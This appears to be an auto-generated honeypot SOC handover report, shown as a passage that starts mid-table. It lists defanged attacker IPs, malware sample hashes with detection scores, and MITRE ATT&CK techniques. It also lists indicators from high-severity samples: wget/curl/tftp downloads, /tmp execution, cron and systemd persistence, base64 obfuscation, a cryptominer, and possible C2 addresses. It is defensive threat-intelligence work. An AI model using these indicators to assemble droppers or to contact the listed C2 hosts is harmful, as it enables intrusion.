| `193.32.162[.]15` | 1 | 2026-11-01 01:08 | 2026-11-01 01:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-11-01 00:54 | 2026-11-01 00:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.76.182[.]120` | 1 | 2026-11-01 01:42 | 2026-11-01 01:43 | 33s | 0 | `T1592` | 🟢 LOW |
| `211.47.82[.]173` | 1 | 2026-11-01 01:05 | 2026-11-01 01:05 | 13s | 0 | `T1592` | 🟢 LOW |
| `221.160.73[.]81` | 1 | 2026-11-01 00:31 | 2026-11-01 00:31 | 28s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-11-01 00:58 | 2026-11-01 00:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]96` | 1 | 2026-11-01 00:26 | 2026-11-01 00:26 | 8s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-11-01 02:52 | 2026-11-01 02:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]152` | 1 | 2026-11-01 02:30 | 2026-11-01 02:30 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]182` | 1 | 2026-11-01 02:52 | 2026-11-01 02:52 | 2s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-01 02:28 | 2026-11-01 02:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.82.77[.]139` | 1 | 2026-11-01 02:37 | 2026-11-01 02:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]20` | 1 | 2026-11-01 01:52 | 2026-11-01 01:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]25` | 1 | 2026-11-01 01:52 | 2026-11-01 01:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.38.187[.]111` | 1 | 2026-11-01 00:01 | 2026-11-01 00:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | 1 | 2026-11-01 01:26 | 2026-11-01 01:26 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `64.62.197[.]152` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 0 |
| `45.79.207[.]110` | US | Linode | **100** ⚠️ | 50 |
| `193.187.110[.]160` | FI | Cyberaegis Casa S.R.L. | **100** ⚠️ | 1 |
| `182.191.118[.]180` | PK | Corporate | **100** ⚠️ | 0 |
| `102.210.149[.]105` | KE | New IP First Block2 | **100** ⚠️ | 50 |
| `124.29.225[.]79` | PK | Broadband Services | **100** ⚠️ | 0 |
| `193.32.162[.]15` | RO | UNMANAGED LTD | **100** ⚠️ | 50 |
| `211.47.82[.]173` | KR | kt HCN Co.,Ltd. | **100** ⚠️ | 27 |
| `86.38.187[.]111` | NL | IPXO | **100** ⚠️ | 5 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 43 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 34 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 22 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 20 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 20 |

---

## 🔕 False Positive Summary (12 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 76 cases |
| Tool 34  | Credential Extractor        | ✅ 425 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 24 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 49 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 12 filtered (15.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 31 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 31 priority case(s) shown individually · 30 recon entry/entries in table (3 group(s) consolidating 6 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-01T03:02:59Z_
